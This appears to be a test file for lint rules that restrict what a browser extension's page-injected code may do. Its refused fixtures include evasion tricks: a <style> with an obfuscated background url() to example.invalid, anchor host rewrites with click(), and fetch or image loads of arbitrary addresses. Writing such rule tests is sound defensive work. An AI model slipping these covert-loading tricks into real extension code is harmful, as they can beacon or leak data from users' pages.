  Object.assign(box.style, { position: 'fixed', background: 'rgba(0,0,0,0.15)', cursor: 'crosshair', left: \`\${sx}px\`, width: '0', top: '12px' });
  box.textContent = u;
  doc.documentElement.appendChild(box);
  box.append(doc.createElement('div'));
  box.addEventListener('mousedown', (e) => { e.preventDefault(); sx = e.clientX; });
  win.addEventListener('keydown', (e: KeyboardEvent) => { if (e.key === 'Escape') box.remove(); });
  if (!box.isConnected) return;
  const text = win.getSelection()?.toString();
  void text;`;
    expect(await verdict(OVERLAY, inStart(code)), code).toEqual([]);
  });

  it('accepts measureImage as it is, and refuses the DOM members it does not use', async () => {
    const real = readFileSync(MEASURE, 'utf8');
    expect(await verdict(MEASURE, real)).toEqual([]);
    for (const body of [
      '[img.src] = [src];',
      'img.src = src;',
      'for (img.src of [src]);',
      "img.ownerDocument.createElementNS(img.ownerDocument.documentElement.namespaceURI, 'style');",
      'void img.ownerDocument;',
      "const st = img.ownerDocument.createElementNS('x', 'style'); st.textContent = src;",
      "try { void img.ownerDocument.createElementNS('x', 'style'); } catch { void 0; }",
      'img.click();',
      'img.setAttribute("src", src);',
      'void img.parentNode;',
      'void img.naturalWidth;',
      'img.scrollTop = 1; void img.offsetParent;',
      'void document.body;',
      'void document.head;',
      'void document.createElement("div");',
      'void document.querySelector("a");',
    ]) {
      const code = `export function measureImage(src: string): void {\n  const img = [...document.images][0]!;\n  ${body}\n  void src;\n}`;
      expect(await verdict(MEASURE, code), body).not.toEqual([]);
    }
  });

  it('judges a member by its kind: a call that is read, a read that is written', async () => {
    for (const code of [
      'const f = box.remove; void f;',
      'box.remove = () => undefined;',
      'box.isConnected = true;',
      'box.textContent += "x"; box.textContent++;',
      'delete box.textContent;',
    ]) {
      expect(await verdict(OVERLAY, inStart(`  ${code}`)), code).not.toEqual([]);
    }
    expect(await domMembers(OVERLAY, inStart('  box.textContent = u;'))).toEqual([]);
    expect(await domMembers(OVERLAY, inStart('  box.remove();'))).toEqual([]);
    expect(await domMembers(OVERLAY, inStart('  box?.remove();'))).toEqual([]);
  });

  it('a window is left to the allowlist of globals (win.document is read, nothing else on it)', async () => {
    expect(await domMembers(OVERLAY, inStart('  void win.document;'))).toEqual([]);
    expect(await reached(OVERLAY, inStart('  void win.fetch;'))).not.toEqual([]);
  });
});

// Round 9 of the review of PR #6 (r4308642691): `dom-members` judges a member by where its symbol is declared, so a DOM value handed to
// a variable, parameter or return of an own `interface` or object type loses its DOM-ness and the members of that type are free
// (`querySelector('a')` with `host` and `click()`, `createElementNS('style')` with a text from run time, in measure.ts
// `ownerDocument.createElementNS('style')`). The class is closed at its source (PAGE_TYPES, the rule fontsnap/page-types): the code of
// the page has no type of its own - no interface but the listed ones, no type literal, mapped type, class or enum, no type name that is
// not a library type, a type parameter or a listed name, and no object literal whose type is inferred. Every fixture is a form of it.
describe('page code has no types of its own', () => {
  const OVERLAY = 'src/select/overlay.ts';
  const NEW_FILE = 'src/select/a-new-file.ts';
  const MEASURE = 'src/background/measure.ts';
  const inSelect = (body: string): string =>
    `export function startSelection(win: Window, u: string, k: string, n: number): void {\n  const doc = win.document;\n  const box = doc.createElement("div");\n  ${body}\n  void [doc, box, u, k, n];\n}`;
  const inMeasure = (body: string): string =>
    `export function measureImage(u: string): void {\n  const box = [...document.images][0]!;\n  ${body}\n  void [box, u];\n}`;
  const DOC =
    'interface D { createElementNS(ns: string | null, n: string): { textContent: string | null }; getElementById(id: string): { click(): void } | null }\n  interface B { ownerDocument: D }\n';
  const FORMS: [string, string, string][] = [
    [
      'P1 own interfaces: ownerDocument, createElementNS(style), click()',
      `${DOC}  const b: B = box;\n  const st = b.ownerDocument.createElementNS(null, 'style');\n  st.textContent = ['html{background:ur', 'l(', u, ')}'].join('');\n  b.ownerDocument.getElementById('x')?.click();`,
      'interface',
    ],
    [
      'P2 a type literal as the annotation of a parameter',
      "const f = (b: { ownerDocument: { createElementNS(ns: string | null, n: string): { textContent: string | null } } }): void => { b.ownerDocument.createElementNS(null, 'style'); };\n  f(box);",
      'type literal',
    ],
    [
      'P3 an own type as a return type',
      `${DOC}  const g = (): B => box;\n  g().ownerDocument.getElementById('x')?.click();`,
      'interface',
    ],
    [
      'P4 satisfies a type literal',
      'const same = box satisfies { ownerDocument: unknown };\n  void same;',
      'type literal',
    ],
    [
      'P5 an own type for an element, written through it',
      'interface Im { src: string }\n  const f = (im: Im): void => { im.src = u; };\n  f(box as never);',
      'interface',
    ],
    [
      'P7 a type inferred from a default parameter',
      'const f = (a = { src: "", click() { return; } }): void => { a.src = u; a.click(); };\n  f(box);',
      'object literal',
    ],
    [
      'P8 an array inferred from an object literal, then push',
      'const list = [{ src: "", click() { return; } }];\n  list.push(box);\n  list[0]!.click();',
      'object literal',
    ],
    [
      'P9 a class with the members of an element',
      'class A { src = ""; click(): void { return; } }\n  const a: A = box;\n  a.click();',
      'class',
    ],
    [
      'P10 a mapped type',
      'type M = { [K in "src" | "click"]: unknown };\n  const m: M = box;\n  void m;',
      'mapped type',
    ],
    [
      'P11 a listed interface declared with a method',
      'interface MeasuredImage { rect: unknown; click(): void }\n  void (0 as unknown as MeasuredImage);',
      'MeasuredImage',
    ],
    [
      'P12 a listed interface declared with a property that is not listed',
      'interface MeasuredImage { rect: number; src: string }\n  void (0 as unknown as MeasuredImage);',
      'MeasuredImage',
    ],
    ['P14 an enum', 'enum E { A, B }\n  void E.A;', 'enum'],
    [
      'P15 a generic with an own constraint',
      'const f = <T extends { src: string }>(t: T): string => t.src;\n  void f;',
      'type literal',
    ],
    [
      'P16 a type alias of a type literal',
      'type T = { src: string };\n  void (0 as unknown as T);',
      'type literal',
    ],
    [
      'P17 an object literal with no library or listed contextual type',
      'const o = { src: u };\n  void o;',
      'object literal',
    ],
    [
      'P18 an object literal as the second argument of something that is not Object.assign',
      'const o = [1].map(() => ({ src: u }));\n  void o;',
      'object literal',
    ],
    [
      'P19 a type named by import("...") instead of an import type declaration',
      "const r: import('../shared/capture').Rect = { x: 0, y: 0, w: 1, h: 1 };\n  void r;",
      'import type expression',
    ],
    [
      'P20 a type taken by typeof import("...")',
      "const m: typeof import('../shared/capture') | null = null;\n  void m;",
      'import type expression',
    ],
  ];

  it.each(FORMS)('refuses %s', async (_what, body, reason) => {
    for (const [file, code] of [
      [OVERLAY, inSelect(body)],
      [NEW_FILE, inSelect(body)],
      [MEASURE, inMeasure(body)],
    ] as const) {
      const messages = await pageTypes(file, code);
      expect(messages, `${file}: ${body}`).not.toEqual([]);
      expect(messages.join('\n'), `${file}: reported for ${reason}`).toContain(reason);
    }
  });

  // The three forms of the reviewer's comment, as written there (only the line that gets the DOM value differs: `doc` is the
  // Document of the overlay, `img` the image that measureImage found, `document` the global of the page function).
  const VERBATIM: [string, string, string][] = [
    [
      'F4 by narrowing: querySelector("a"), host and click()',
      "interface Ck { click(): void; host: string }\n  interface Qs { querySelector(s: string): Ck | null }\n  const pick = (d: Qs) => d.querySelector('a');\n  const a7 = pick(DOC);\n  if (a7) { a7.host = 'example.invalid'; a7.click(); }",
      'interface',
    ],
    [
      'E2 by narrowing: createElementNS("style") with a text from run time',
      "interface Mk { createElementNS(ns: string, n: string): Node; documentElement: { append(e: Node): void } }\n  const d1: Mk = DOC;\n  const st1 = d1.createElementNS(['http:/', 'www.w3.org', '1999', 'xhtml'].join('/'), 'style');\n  st1.textContent = ['b', 'ody{background:', ['ur', 'l(', ['https:/', 'example.invalid', 'n2'].join('/'), ')'].join(''), '}'].join('');\n  d1.documentElement.append(st1);",
      'interface',
    ],
    [
      'measure.ts: <style> through ownerDocument',
      "interface El { textContent: string | null }\n  interface Od { ownerDocument: { createElementNS(ns: string, n: string): El; body: { append(e: El | string): void } } }\n  const w9: Od = IMG;\n  const st9 = w9.ownerDocument.createElementNS(['http:/', 'www.w3.org', '1999', 'xhtml'].join('/'), 'style');\n  st9.textContent = ['ur', 'l(', ['https:/', 'example.invalid', 'n9'].join('/'), ')'].join('');\n  w9.ownerDocument.body.append(st9);",
      'interface',
    ],
  ];

  it.each(VERBATIM)('refuses, as written by the reviewer: %s', async (_what, body, reason) => {
    for (const [file, code] of [
      [OVERLAY, inSelect(body.replaceAll('DOC', 'doc').replaceAll('IMG', 'box'))],
      [NEW_FILE, inSelect(body.replaceAll('DOC', 'doc').replaceAll('IMG', 'box'))],
      [MEASURE, inMeasure(body.replaceAll('DOC', 'document').replaceAll('IMG', 'box'))],
    ] as const) {
      const messages = await pageTypes(file, code);
      expect(messages, `${file}: ${body}`).not.toEqual([]);
      expect(messages.join('\n'), `${file}: reported for ${reason}`).toContain(reason);
    }
  });

  it('refuses an import type of a name that is not listed, and one listed name from the wrong file', async () => {
    for (const code of [
      "import type { Request } from '../shared/messages';\nexport function startSelection(win: Window, r?: Request): void {\n  void [win, r];\n}",
      "import type { Rect } from '../shared/messages';\nexport function startSelection(win: Window, r?: Rect): void {\n  void [win, r];\n}",
    ]) {
      expect(await pageTypes(NEW_FILE, code), code).not.toEqual([]);
    }
  });

  it('accepts what the page code really uses: library types, listed types, type parameters, option objects, style objects', async () => {
    expect(
      await pageTypes(
        NEW_FILE,
        `import type { Rect } from '../shared/capture';
export function startSelection(win: Window, r: Rect): void {
  const doc = win.document;
  const box = doc.createElement('div');
  const pick = <T extends Node>(t: T): T => t;
  const list: HTMLElement[] = [pick(box)];
  Object.assign(box.style, { position: 'fixed', left: '0' });
  box.addEventListener('click', () => undefined, { passive: true });
  void [list, r];
}`,
      ),
    ).toEqual([]);
    expect(
      await pageTypes(
        MEASURE,
        `import type { Rect } from '../shared/capture';
interface MeasuredImage { rect: Rect; dpr: number; saved: number[]; box: Rect }
export async function measureImage(src: string): Promise<MeasuredImage | null> {
  const img = [...document.images].find((i) => i.currentSrc === src);
  if (!img) return null;
  img.scrollIntoView({ block: 'nearest', inline: 'nearest' });
  const b = img.getBoundingClientRect();
  const rect: Rect = { x: b.left, y: b.top, w: b.width, h: b.height };
  return { rect, dpr: 1, saved: [], box: rect };
}`,
      ),
    ).toEqual([]);
  });

  it('the files of the page code as they are in the repository are clean', async () => {
    for (const file of [OVERLAY, 'src/select/chrome.ts', 'src/select/index.ts', MEASURE]) {
      expect(await pageTypes(file, readFileSync(file, 'utf8')), file).toEqual([]);
    }
  });
});

// The one exception of Part I (the brief of 18.10.2026): loadImagePixels may load ONE address - the one it is given, the clicked
// image's srcUrl - with `new Image()`, `crossOrigin = 'anonymous'` and one `<image>.src = <its first parameter>`. Everything else a page
// function may not do stays refused, in this file and everywhere else; the exception does not leak to measure.ts or src/select.
describe('loadImagePixels: the narrow exception to "nothing that loads"', () => {
  const LOADER = 'src/background/load-image.ts';
  const verdict = async (file: string, code: string): Promise<string[]> => [
    ...(await domMembers(file, code)),
    ...(await pageTypes(file, code)),
    ...(await reached(file, code)),
    ...(await flagged(file, code)),
  ];
  const wrap = (body: string): string =>
    `export async function loadImagePixels(src: string): Promise<string | null> {\n  ${body}\n  return null;\n}`;
  const BASE =
    "const image = new Image();\n  image.crossOrigin = 'anonymous';\n  image.src = src;\n  await image.decode();";

  it('accepts the file as it is, and the minimal loader', async () => {
    expect(await verdict(LOADER, readFileSync(LOADER, 'utf8'))).toEqual([]);
    expect(await verdict(LOADER, wrap(BASE))).toEqual([]);
  });

  const FORMS: [string, string][] = [
    ['a second write of src', `${BASE}\n  image.src = src;`],
    [
      'src set to a literal address',
      "const image = new Image();\n  image.src = 'https://example.invalid/x.png';",
    ],
    [
      'src set to the parameter plus something',
      'const image = new Image();\n  image.src = src + "#";',
    ],
    [
      'src set to another variable',
      'const other = String(Date.now());\n  const image = new Image();\n  image.src = other;',
    ],
    [
      'src set from a nested function',
      'const image = new Image();\n  const go = (): void => { image.src = src; };\n  go();',
    ],
    ['src appended to', 'const image = new Image();\n  image.src += src;'],
    ['src set by a destructuring', 'const image = new Image();\n  [image.src] = [src];'],
    [
      'src set after the parameter was reassigned',
      'let again = src;\n  const image = new Image();\n  image.src = again;',
    ],
    [
      'the parameter itself reassigned',
      'src = "https://example.invalid/";\n  const image = new Image();\n  image.src = src;',
    ],
    ['an Image with an argument', 'void new Image(10);'],
    [
      'two Image objects',
      'const a = new Image();\n  const b = new Image();\n  a.src = src;\n  void b;',
    ],
    ['an Image that is not constructed', 'const make = Image;\n  void make;'],
    ['Image.prototype', 'void Image.prototype;'],
    [
      "crossOrigin 'use-credentials'",
      "const image = new Image();\n  image.crossOrigin = 'use-credentials';",
    ],
    ['crossOrigin from a variable', 'const image = new Image();\n  image.crossOrigin = src;'],
    ['fetch', 'void fetch(src);'],
    ['an img element', "void document.createElement('img');"],
    ['a canvas element', "void document.createElement('canvas');"],
    ['setAttribute src', 'const image = new Image();\n  image.setAttribute("src", src);'],
    ['href', 'const image = new Image();\n  image.srcset = src;'],
    ['a style', 'const image = new Image();\n  void image.style;'],
    [
      'a call of the loader itself with another address (review: recursion)',
      "if (src) return loadImagePixels('https://example.invalid/' + src);",
    ],
    ['the loader taken as a value', 'const again = loadImagePixels;\n  void again;'],
    [
      'src written on an element of the page, not on the Image the loader made',
      "const known = [...document.images][0];\n  const image = new Image();\n  image.crossOrigin = 'anonymous';\n  if (known) known.src = src;\n  void image;",
    ],
    [
      'src written on an element of the page (the one the loader reads)',
      'const known = [...document.images].find((i) => i.currentSrc === src);\n  if (known) {\n    known.src = src;\n  }',
    ],
    [
      'src written on an Image that was handed in, not made here',
      "const make = (): HTMLImageElement => new Image();\n  const image = make();\n  image.crossOrigin = 'anonymous';\n  image.src = src;",
    ],
    [
      'src written on a let that holds the Image',
      "let image = new Image();\n  image.crossOrigin = 'anonymous';\n  image.src = src;\n  void image;",
    ],
    [
      'src written on an Image that was reassigned to an element of the page',
      "const known = [...document.images][0];\n  let image = new Image();\n  image.crossOrigin = 'anonymous';\n  if (known) image = known;\n  image.src = src;",
    ],
    ['no crossOrigin at all', 'const image = new Image();\n  image.src = src;'],
    [
      'crossOrigin written after src',
      "const image = new Image();\n  image.src = src;\n  image.crossOrigin = 'anonymous';",
    ],
    [
      'crossOrigin written on another object',
      "const known = [...document.images][0];\n  const image = new Image();\n  if (known) known.crossOrigin = 'anonymous';\n  image.src = src;",
    ],
    [
      'crossOrigin written in a branch, src after it',
      "const image = new Image();\n  if (src) image.crossOrigin = 'anonymous';\n  image.src = src;",
    ],
    [
      'crossOrigin written twice',
      "const image = new Image();\n  image.crossOrigin = 'anonymous';\n  image.crossOrigin = 'anonymous';\n  image.src = src;",
    ],
    [
      'src as the only statement of a branch with no crossOrigin before it',
      "const image = new Image();\n  image.crossOrigin = 'anonymous';\n  if (src) image.src = src;",
    ],
    [
      'src set from the parameter of another function',
      'const inner = (s: string): void => {\n    const image = new Image();\n    image.src = s;\n  };\n  inner(src);',
    ],
  ];
  it.each(FORMS)('refuses %s', async (_what, body) => {
    expect(await verdict(LOADER, wrap(body)), body).not.toEqual([]);
  });

  it('refuses a value import', async () => {
    const code = `import { MAX_CROP_SIDE } from '../shared/capture';\n${wrap(`${BASE}\n  void MAX_CROP_SIDE;`)}`;
    expect(await verdict(LOADER, code)).not.toEqual([]);
  });

  it('does not leak: no Image and no src write in measure.ts or in src/select', async () => {
    for (const [file, code] of [
      [
        'src/background/measure.ts',
        'export function measureImage(src: string): void {\n  const image = new Image();\n  image.crossOrigin = "anonymous";\n  image.src = src;\n}',
      ],
      [
        'src/select/overlay.ts',
        'export function startSelection(win: Window, src: string): void {\n  void win;\n  const image = new Image();\n  image.src = src;\n}',
      ],
      [
        'src/select/a-new-file.ts',
        'export function f(src: string): void {\n  const image = new Image();\n  image.src = src;\n}',
      ],
    ] as const) {
      expect(await verdict(file, code), file).not.toEqual([]);
    }
  });

  it('the exception covers only that file: the same minimal loader is refused anywhere else in src', async () => {
    expect(await reached('src/background/shot.ts', wrap(BASE))).not.toEqual([]);
  });
});
